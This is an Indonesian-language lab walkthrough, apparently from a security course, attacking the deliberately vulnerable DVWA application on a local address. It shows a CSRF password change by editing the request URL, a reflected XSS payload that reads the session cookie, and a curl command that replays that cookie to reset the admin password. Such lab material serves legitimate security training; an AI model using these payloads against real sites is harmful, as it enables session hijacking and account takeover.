## LESSON 10

Inti dari Lesson 10 adalah mendapatkan 4 hal, yaitu:
1. Test **CSRF attack**
2. Capture dan manipulasi **CSRF URL** untuk mengubah **Password** admin
3. Mendapatkan **Cookie Session** menggunakan **Reflecive XSS attack**
4. Membuat **Curl CSRF** untuk mengubah **Password** admin

**NOTE**
- IP yang digunakan adalah sesuai dengan IP tempat DVWA ter-deploy

### Langkah-langkah

**A. CSRF**
1. Pilih **CSRF** dan masukkan **Password baru** dengan **abc123**

![SS 1](LESSON_10/1.png)

2. Setelah mengganti dengan **abc123**, ubah **Password** tersebut dari **abc123** mejadi **test123** menggunakan **URL**

Sebelum

![SS 2](LESSON_10/2.png)

Sesudah

![SS 3](LESSON_10/3.png)

3. **Copy** **URL** ke dalam **Notepad**

![SS 4](LESSON_10/4.png)

**B. Test Password yang Telah Diubah**
1. Logout dari **DVWA** dan masuk kembali dengan **Password** yang baru *test123*

![SS 5](LESSON_10/5.png)

**C. XSS Reflected**
1. Pilih menu **XSS Reflected** dan masukkan command berikut untuk mendapatkan **Cookie**

```
<script>alert(document.cookie)</script>
```

![SS 6](LESSON_10/6.png)

2. **Copy** **Cookie**

![SS 7](LESSON_10/7.png)

3. **Paste** **Cookie**

![SS 8](LESSON_10/8.png)

**D. Membangun Curl String**
1. Masukkan command berikut untuk membangun **Curl String**

```
curl --cookie "security=low; PHPSESSID=c0o6r5agj13d6ngqspllu9i6b2" --location "http://192.168.1.103/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#"
```

![SS 9](LESSON_10/9.png)

2. Masukkan 

```
| grep "Password Changed" | tee curl.txt

curl --cookie "security=low; PHPSESSID=c0o6r5agj13d6ngqspllu9i6b2" --location "http://192.168.1.103/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#" | grep "Password Changed" | tee curl.txt
```

![SS 10](LESSON_10/10.png)

Hasil

![SS 11](LESSON_10/11.png)

**D. Test Curl String Password Change**
1. Logout dari DVWA dan masuk dengan **Password** baru

![SS 12](LESSON_10/12.png)

2. Jika berhasil maka akan muncul ini

![SS 13](LESSON_10/13.png)

### Kesimpulan Lesson 10

Menggunakan **CSRF** dan **Curl String** dapat mengubah **Password** dari **Admin DVWA**
